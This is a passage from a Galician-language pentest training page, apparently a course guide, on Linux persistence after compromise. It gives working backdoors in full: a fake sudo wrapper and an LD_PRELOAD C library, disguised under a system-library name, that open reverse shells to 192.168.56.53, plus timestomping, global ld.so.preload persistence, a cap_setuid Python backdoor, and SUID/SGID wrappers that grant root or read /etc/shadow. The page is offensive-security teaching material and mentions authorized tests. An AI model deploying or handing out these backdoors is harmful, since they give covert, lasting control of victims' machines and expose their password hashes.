+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; /opt/.hidden/sudo</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="s">#!/bin/bash</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="s">bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.53/7777 0&gt;&amp;1&#39; &amp;</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="s">/usr/bin/sudo &quot;$@&quot;</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="s">EOF</span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/opt/.hidden/sudo
+</span></code></pre></div></p>
+<p>Agora, cada vez que o usuario execute comandos como <code>ls</code> ou <code>sudo</code>, activarase unha reverse shell mentres o comando real tamén se executa, facendo que pase desapercibido.</p>
+<hr />
+<h3 id="opcion-9-biblioteca-compartida-maliciosa-ld_preload-estabilizada">Opción 9 - Biblioteca compartida maliciosa (LD_PRELOAD) - Estabilizada</h3>
+<p>Esta técnica inxecta código malicioso mediante bibliotecas compartidas. Esta versión inclúe <strong>protección anti-recursión</strong> e <strong>desacoplamento (setsid)</strong> para evitar colgar o sistema ou mostrar erros na consola.</p>
+<p>Almacenaremos a librería nunha ruta do sistema (<code>/usr/lib</code>) cun nome enganoso para evitar a súa detección e borrado.</p>
+<p><strong>Requisitos:</strong> Acceso <strong>Root</strong> na máquina vítima.</p>
+<p><strong>Paso 1: Crear o código malicioso (C) Mellorado</strong></p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="cm">/* Gardar como system_update.c */</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="cp">#define _GNU_SOURCE</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span>
+</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>
+</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="kt">void</span><span class="w"> </span><span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span><span class="w"> </span><span class="n">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="w">    </span><span class="cm">/* PROTECCIÓN ANTI-RECURSIÓN E ANTI-BUCLE */</span>
+</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;SYS_UPDATE_ACTIVE&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span>
+</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a>
+</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a><span class="w">    </span><span class="cm">/* Limpamos LD_PRELOAD para o fillo */</span>
+</span><span id="__span-50-16"><a id="__codelineno-50-16" name="__codelineno-50-16" href="#__codelineno-50-16"></a><span class="w">    </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">);</span>
+</span><span id="__span-50-17"><a id="__codelineno-50-17" name="__codelineno-50-17" href="#__codelineno-50-17"></a><span class="w">    </span><span class="n">setenv</span><span class="p">(</span><span class="s">&quot;SYS_UPDATE_ACTIVE&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;1&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+</span><span id="__span-50-18"><a id="__codelineno-50-18" name="__codelineno-50-18" href="#__codelineno-50-18"></a>
+</span><span id="__span-50-19"><a id="__codelineno-50-19" name="__codelineno-50-19" href="#__codelineno-50-19"></a><span class="w">    </span><span class="cm">/* Facemos fork para executar en segundo plano */</span>
+</span><span id="__span-50-20"><a id="__codelineno-50-20" name="__codelineno-50-20" href="#__codelineno-50-20"></a><span class="w">    </span><span class="kt">pid_t</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span>
+</span><span id="__span-50-21"><a id="__codelineno-50-21" name="__codelineno-50-21" href="#__codelineno-50-21"></a>
+</span><span id="__span-50-22"><a id="__codelineno-50-22" name="__codelineno-50-22" href="#__codelineno-50-22"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-50-23"><a id="__codelineno-50-23" name="__codelineno-50-23" href="#__codelineno-50-23"></a><span class="w">        </span><span class="cm">/* PROCESO FILLO (Malicioso) */</span>
+</span><span id="__span-50-24"><a id="__codelineno-50-24" name="__codelineno-50-24" href="#__codelineno-50-24"></a>
+</span><span id="__span-50-25"><a id="__codelineno-50-25" name="__codelineno-50-25" href="#__codelineno-50-25"></a><span class="w">        </span><span class="cm">/* 1. setsid(): Crea unha nova sesión para desvincularse da terminal actual. */</span>
+</span><span id="__span-50-26"><a id="__codelineno-50-26" name="__codelineno-50-26" href="#__codelineno-50-26"></a><span class="w">        </span><span class="n">setsid</span><span class="p">();</span>
+</span><span id="__span-50-27"><a id="__codelineno-50-27" name="__codelineno-50-27" href="#__codelineno-50-27"></a>
+</span><span id="__span-50-28"><a id="__codelineno-50-28" name="__codelineno-50-28" href="#__codelineno-50-28"></a><span class="w">        </span><span class="cm">/* 2. Rediriximos stdin/stdout/stderr a /dev/null temporalmente */</span>
+</span><span id="__span-50-29"><a id="__codelineno-50-29" name="__codelineno-50-29" href="#__codelineno-50-29"></a><span class="w">        </span><span class="n">freopen</span><span class="p">(</span><span class="s">&quot;/dev/null&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+</span><span id="__span-50-30"><a id="__codelineno-50-30" name="__codelineno-50-30" href="#__codelineno-50-30"></a><span class="w">        </span><span class="n">freopen</span><span class="p">(</span><span class="s">&quot;/dev/null&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;w&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="p">);</span>
+</span><span id="__span-50-31"><a id="__codelineno-50-31" name="__codelineno-50-31" href="#__codelineno-50-31"></a><span class="w">        </span><span class="n">freopen</span><span class="p">(</span><span class="s">&quot;/dev/null&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;w&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">stderr</span><span class="p">);</span>
+</span><span id="__span-50-32"><a id="__codelineno-50-32" name="__codelineno-50-32" href="#__codelineno-50-32"></a>
+</span><span id="__span-50-33"><a id="__codelineno-50-33" name="__codelineno-50-33" href="#__codelineno-50-33"></a><span class="w">        </span><span class="cm">/* 3. Executamos a reverse shell */</span>
+</span><span id="__span-50-34"><a id="__codelineno-50-34" name="__codelineno-50-34" href="#__codelineno-50-34"></a><span class="w">        </span><span class="cm">/* IMPORTANTE: Cambia a IP (192.168.56.53) e PORTO (8888) pola túa Kali */</span>
+</span><span id="__span-50-35"><a id="__codelineno-50-35" name="__codelineno-50-35" href="#__codelineno-50-35"></a><span class="w">        </span><span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.53/8888 0&gt;&amp;1&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-50-36"><a id="__codelineno-50-36" name="__codelineno-50-36" href="#__codelineno-50-36"></a>
+</span><span id="__span-50-37"><a id="__codelineno-50-37" name="__codelineno-50-37" href="#__codelineno-50-37"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-50-38"><a id="__codelineno-50-38" name="__codelineno-50-38" href="#__codelineno-50-38"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-50-39"><a id="__codelineno-50-39" name="__codelineno-50-39" href="#__codelineno-50-39"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>Paso 2: Compilación</strong></p>
+<ul>
+<li>
+<p><strong>Na máquina Vítima:</strong>
+    <div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>gcc<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>/tmp/system_update.so<span class="w"> </span>system_update.c<span class="w"> </span>-nostartfiles
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Na máquina Kali (se a vítima non ten gcc):</strong>
+    <div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c1"># Para vítima 64 bits (Debian 11 estándar)</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>gcc<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>system_update.so<span class="w"> </span>system_update.c<span class="w"> </span>-nostartfiles
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="c1"># Para vítima 32 bits</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>gcc<span class="w"> </span>-m32<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>system_update.so<span class="w"> </span>system_update.c<span class="w"> </span>-nostartfiles
+</span></code></pre></div>
+    <em>(Despois subir <code>system_update.so</code> á vítima).</em></p>
+</li>
+</ul>
+<p><strong>Paso 3: Instalación e Camuflaxe</strong></p>
+<p>Na máquina vítima (como root):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c1"># 1. Mover a unha ruta persistente cun nome lexítimo</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>mv<span class="w"> </span>/tmp/system_update.so<span class="w"> </span>/usr/lib/libsystemd-agent.so
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="c1"># 2. Axustar permisos (root propietario, lexible por todos, non escribible)</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>chown<span class="w"> </span>root:root<span class="w"> </span>/usr/lib/libsystemd-agent.so
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>chmod<span class="w"> </span><span class="m">644</span><span class="w"> </span>/usr/lib/libsystemd-agent.so
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a>
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="c1"># 3. (Opcional) Timestomping: Copiar a data de sudoers</span>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>touch<span class="w"> </span>-r<span class="w"> </span>/usr/lib/sudo/sudoers.so<span class="w"> </span>/usr/lib/libsystemd-agent.so
+</span></code></pre></div>
+<p><strong>Paso 4: Activación da Persistencia</strong></p>
+<p><strong>Opción A: Persistencia por Usuario (Recomendada):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export LD_PRELOAD=/usr/lib/libsystemd-agent.so&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/root/.bashrc
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="c1"># Ou para usuario normal:</span>
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export LD_PRELOAD=/usr/lib/libsystemd-agent.so&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/home/dimitri/.bashrc
+</span></code></pre></div></p>
+<p><strong>Opción B: Persistencia Global (/etc/ld.so.preload):</strong></p>
+<div class="admonition danger">
+<p class="admonition-title">Alto Risco</p>
+<p>Executa a shell con CADA comando do sistema. Asegúrate de que o código C está ben compilado.</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/usr/lib/libsystemd-agent.so&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/ld.so.preload
+</span></code></pre></div>
+<hr />
+<h3 id="opcion-10-capabilities-en-binarios-metodo-python">Opción 10 - Capabilities en binarios (Método Python)</h3>
+<p>Esta técnica usa capabilities de Linux. Como os binarios estándar como <code>bash</code> adoitan limpar privilexios ao arrincar, usaremos unha copia do intérprete de <strong>Python</strong>, que obedece ás capabilities sen restricións.</p>
+<p>Na máquina comprometida, como <code>root</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="c1"># 1. Facemos unha copia do intérprete de Python (para non tocar o orixinal)</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>cp<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/tmp/python_cap
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="c1"># 2. Asignamos a capability &#39;cap_setuid&#39; (permite cambiar o UID)</span>
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>setcap<span class="w"> </span>cap_setuid+ep<span class="w"> </span>/tmp/python_cap
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="c1"># 3. Verificamos que se aplicou correctamente</span>
+</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a>getcap<span class="w"> </span>/tmp/python_cap
+</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a><span class="c1"># Saída: /tmp/python_cap cap_setuid=ep</span>
+</span></code></pre></div>
+<p><strong>Execución (como usuario normal <code>dimitri</code>):</strong>
+O usuario pode agora usar ese python especial para facerse root e lanzar unha shell:</p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>/tmp/python_cap<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span>
+</span></code></pre></div>
+<em>Resultado: Obterás unha shell <code>#</code> de root.</em></p>
+<hr />
+<h3 id="opcion-11-binario-suid-malicioso-wrapper-estatico">Opción 11 - Binario SUID malicioso (Wrapper Estático)</h3>
+<p>Debian 11 e versións modernas de Bash baixan os privilexios automaticamente se detectan que o binario é SUID. Para evitalo, usaremos un <strong>wrapper en C compilado estaticamente</strong>.</p>
+<div class="admonition failure">
+<p class="admonition-title">Problema de Versións (GLIBC)</p>
+<p>Se compilamos en Kali sen opcións especiais, o binario fallará na vítima. Usaremos <code>-static</code> para solucionalo.</p>
+</div>
+<p><strong>Paso 1: Na máquina Kali (Atacante)</strong>
+Creamos o código e compilamos estáticamente.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; suid_wrapper.c</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="s">#include &lt;stdio.h&gt;</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="s">#include &lt;stdlib.h&gt;</span>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="s">#include &lt;unistd.h&gt;</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="s">int main() {</span>
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="s">    /* Forzamos que o ID Real e Efectivo sexan 0 (root) */</span>
+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="s">    setuid(0);</span>
+</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="s">    setgid(0);</span>
+</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="s">    system(&quot;/bin/bash&quot;);</span>
+</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="s">    return 0;</span>
+</span><span id="__span-58-12"><a id="__codelineno-58-12" name="__codelineno-58-12" href="#__codelineno-58-12"></a><span class="s">}</span>
+</span><span id="__span-58-13"><a id="__codelineno-58-13" name="__codelineno-58-13" href="#__codelineno-58-13"></a><span class="s">EOF</span>
+</span><span id="__span-58-14"><a id="__codelineno-58-14" name="__codelineno-58-14" href="#__codelineno-58-14"></a>
+</span><span id="__span-58-15"><a id="__codelineno-58-15" name="__codelineno-58-15" href="#__codelineno-58-15"></a><span class="c1"># Compilar de forma ESTÁTICA</span>
+</span><span id="__span-58-16"><a id="__codelineno-58-16" name="__codelineno-58-16" href="#__codelineno-58-16"></a>gcc<span class="w"> </span>-static<span class="w"> </span>suid_wrapper.c<span class="w"> </span>-o<span class="w"> </span>sys-backup
+</span></code></pre></div>
+<p><strong>Paso 2: Instalación na Vítima</strong>
+Sube o ficheiro <code>sys-backup</code> á máquina vítima e colócao en <code>/usr/bin</code>.</p>
+<p>Na máquina vítima (como <code>root</code>):
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>chown<span class="w"> </span>root:root<span class="w"> </span>/usr/bin/sys-backup
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>/usr/bin/sys-backup
+</span></code></pre></div></p>
+<p><strong>Execución (como usuario normal):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>sys-backup
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="c1"># whoami -&gt; root</span>
+</span></code></pre></div></p>
+<hr />
+<h3 id="opcion-12-binario-sgid-malicioso-wrapper-estatico">Opción 12 - Binario SGID malicioso (Wrapper Estático)</h3>
+<p>Esta técnica é idéntica á anterior pero enfocada a obter acceso a un <strong>grupo</strong> privilexiado (como <code>shadow</code>) usando <strong><code>setregid</code></strong> para evitar que Bash elimine os permisos.</p>
+<p><strong>Paso 1: Na máquina Kali (Atacante)</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>cat<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39; &gt; sgid_wrapper.c</span>
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="s">#define _GNU_SOURCE</span>
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="s">#include &lt;stdio.h&gt;</span>
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="s">#include &lt;stdlib.h&gt;</span>
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a><span class="s">#include &lt;unistd.h&gt;</span>
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="s">#include &lt;sys/types.h&gt;</span>
+</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>
+</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a><span class="s">int main() {</span>
+</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a><span class="s">    /* 1. Obtemos o GID Efectivo (shadow) */</span>
+</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a><span class="s">    gid_t sgid = getegid();</span>
+</span><span id="__span-61-11"><a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a>
+</span><span id="__span-61-12"><a id="__codelineno-61-12" name="__codelineno-61-12" href="#__codelineno-61-12"></a><span class="s">    /* 2. A CLAVE: setregid (Real, Efectivo) </span>
+</span><span id="__span-61-13"><a id="__codelineno-61-13" name="__codelineno-61-13" href="#__codelineno-61-13"></a><span class="s">       Establecemos AMBOS ao grupo do ficheiro para que Bash non se queixe. */</span>
+</span><span id="__span-61-14"><a id="__codelineno-61-14" name="__codelineno-61-14" href="#__codelineno-61-14"></a><span class="s">    setregid(sgid, sgid);</span>
+</span><span id="__span-61-15"><a id="__codelineno-61-15" name="__codelineno-61-15" href="#__codelineno-61-15"></a>
+</span><span id="__span-61-16"><a id="__codelineno-61-16" name="__codelineno-61-16" href="#__codelineno-61-16"></a><span class="s">    system(&quot;/bin/bash&quot;);</span>
+</span><span id="__span-61-17"><a id="__codelineno-61-17" name="__codelineno-61-17" href="#__codelineno-61-17"></a><span class="s">    return 0;</span>
+</span><span id="__span-61-18"><a id="__codelineno-61-18" name="__codelineno-61-18" href="#__codelineno-61-18"></a><span class="s">}</span>
+</span><span id="__span-61-19"><a id="__codelineno-61-19" name="__codelineno-61-19" href="#__codelineno-61-19"></a><span class="s">EOF</span>
+</span><span id="__span-61-20"><a id="__codelineno-61-20" name="__codelineno-61-20" href="#__codelineno-61-20"></a>
+</span><span id="__span-61-21"><a id="__codelineno-61-21" name="__codelineno-61-21" href="#__codelineno-61-21"></a><span class="c1"># Compilar de forma ESTÁTICA</span>
+</span><span id="__span-61-22"><a id="__codelineno-61-22" name="__codelineno-61-22" href="#__codelineno-61-22"></a>gcc<span class="w"> </span>-static<span class="w"> </span>sgid_wrapper.c<span class="w"> </span>-o<span class="w"> </span>read-shadow
+</span></code></pre></div>
+<p><strong>Paso 2: Instalación na Vítima</strong>
+Sube o ficheiro <code>read-shadow</code> á máquina vítima.</p>
+<p>Na máquina vítima (como <code>root</code>):
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>mv<span class="w"> </span>read-shadow<span class="w"> </span>/usr/bin/read-shadow
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>chown<span class="w"> </span>root:shadow<span class="w"> </span>/usr/bin/read-shadow
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>chmod<span class="w"> </span><span class="m">2755</span><span class="w"> </span>/usr/bin/read-shadow
+</span></code></pre></div></p>
+<p><strong>Execución (como usuario normal):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>read-shadow
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>id
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a><span class="c1"># Debería saír: ... gid=42(shadow) ...</span>
+</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>cat<span class="w"> </span>/etc/shadow
+</span></code></pre></div></p>
+<hr />
+<h3 id="conclusion">Conclusión</h3>
+<p>Estas técnicas de persistencia permiten manter acceso á máquina comprometida a través de diferentes métodos, cada un con vantaxes específicas segundo o contexto do pentest. É importante documentar todos os métodos usados e eliminalos ao finalizar as probas autorizadas.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
